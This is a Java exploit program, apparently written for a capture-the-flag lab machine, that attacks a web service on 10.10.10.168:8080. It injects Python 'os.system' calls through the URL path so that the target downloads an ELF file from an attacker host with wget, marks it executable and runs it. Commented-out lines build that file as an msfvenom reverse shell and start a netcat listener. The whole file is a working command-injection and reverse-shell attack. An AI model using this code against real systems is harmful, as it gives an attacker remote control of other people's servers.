package COM.spti.spti;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

import threads.CommandThread;


public class App {

	public static void main(String[] args) {

		String LHOST = args[0];
		String LPORT = args[1];
		
		/*String cmd = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o jj.elf";
		ejecutar(cmd);
		
		//CommandThread servidorPy = new CommandThread("python -m SimpleHTTPServer 80"); 
		//servidorPy.start();
		
		
		
		cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 1");
		cmd = "chmod +x /tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 2");
		
		//CommandThread escuchando = new CommandThread("nc -nvlp " + LPORT); 
		//escuchando.start();
		
		System.out.println("SERVIDOR>>>>>>" + "nc -nvlp " + LPORT);
		cmd = "/tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 3");
		*/
		String cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
		URL url;
		try {
			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
			HttpURLConnection con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
				
	}

	// CommandThread servidorPython = new CommandThread("python -mSimpleHTTPServer
	// 80"); //servidorPython.start();
	public static void ejecutar(String cmd) {
		 ProcessBuilder processBuilder = new ProcessBuilder();
		 processBuilder.command("bash", "-c", cmd);
			
			try {
				Process process = processBuilder.start();			
				
				process.getInputStream();
				
				process.waitFor();
				

			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
	 }
	
	public static void get(String cmd) {
		
		URL url;
		try {
			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
			HttpURLConnection con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.getInputStream();
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
}
	



